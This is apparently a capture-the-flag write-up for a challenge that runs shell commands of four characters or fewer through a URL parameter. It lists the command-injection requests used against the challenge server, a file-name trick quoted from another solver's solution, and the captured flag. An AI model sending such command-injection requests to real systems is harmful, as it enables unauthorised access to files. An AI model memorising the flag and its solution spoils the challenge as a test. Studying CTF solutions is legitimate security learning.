@@ -1,0 +1,26 @@
+# hackme 500pt : can you please just hack me, I will execute all your commands but only 4 chars in length.
+
+`http://207.180.200.166:8000/?cmd=pwd`
+`http://207.180.200.166:8000/?cmd=help`
+`http://207.180.200.166:8000/?cmd=ls%20-l` # exec 5 chars great ;)
+`http://207.180.200.166:8000/?cmd=ls%20/`  # flag.txt
+
+At the beginning i tried commands with the backslashs but wont work.
+then tried to use some Text processing commands (https://en.wikipedia.org/wiki/List_of_Unix_commands):
+
+pr : wont work here :/
+wc /* : localy works / chall ERROR 500 
+nl /* : localy works / chall ERROR 500
+
+FEW MOMENTS LATER XD, i typed `ls -l` and i figure out i got file name 'core' with size over 200M i realized that `nl /*` worked as well so juste execute `cat *`.
+
+`http://207.180.200.166:8000/?cmd=cat%20*`
+
+# 
+# flag{ju57_g0tt@_5pl1t_Em3012}
+# 
+
+Another solution from '0verflowme [dcua]' :
+
+`>cat`
+`* /f*`
